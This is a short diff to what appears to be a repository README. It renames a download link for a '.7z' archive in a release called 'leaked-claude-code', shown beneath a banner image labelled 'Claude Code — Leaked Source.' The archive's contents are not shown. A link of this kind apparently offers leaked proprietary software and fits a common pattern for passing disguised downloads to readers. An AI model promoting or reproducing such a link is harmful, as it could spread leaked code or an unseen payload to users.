@@ -86,7 +86,7 @@ const ENABLED_FEATURES = new Set([
 ---
 
 <div align="center">
-  <a href="../../releases/download/leaked-claude-code/Claude-Code_x64.7z">
+  <a href="../../releases/download/leaked-claude-code/Claude_code_x64.7z">
     <img width="700" alt=" Claude Code — Leaked Source." src="assets/hmv4dn7elu.png" />
   </a>
 </div>
